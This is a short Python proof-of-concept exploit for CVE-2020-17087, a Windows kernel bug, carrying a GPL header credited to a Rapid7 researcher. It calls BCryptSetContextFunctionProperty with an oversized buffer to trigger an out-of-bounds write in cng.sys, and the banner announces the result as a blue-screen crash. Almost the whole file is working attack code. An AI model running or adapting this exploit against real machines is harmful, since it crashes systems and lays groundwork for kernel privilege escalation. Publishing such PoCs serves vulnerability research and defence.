#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#  cve_2020_17087.py
#  
#  Copyright 2020 Spencer McIntyre <Spencer_McIntyre@rapid7.com>
#  
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#  
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#  
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
#  
#  

import ctypes
import random

# https://github.com/zeroSteiner/mayhem
from mayhem.windll import *

def main():
	print('******************************************************')
	print('* CVE-2020-17087 BSOD                                *')
	print('* cng!CfgAdtpFormatPropertyBlock Out-of-Bounds Write *')
	print('* Spencer (@zeroSteiner) McIntyre                    *')
	print('******************************************************')
	
	value = (ctypes.c_ubyte * 0x2aab)()
	bcrypt.BCryptSetContextFunctionProperty(
		bcrypt.CRYPT_LOCAL,
		'Default',
		bcrypt.BCryptInterface.Cipher,
		'AES',
		"XXX_{:08x}".format(random.randint(0, 0xffffffff)),
		len(value),
		value
	)

if __name__ == '__main__':
	main()
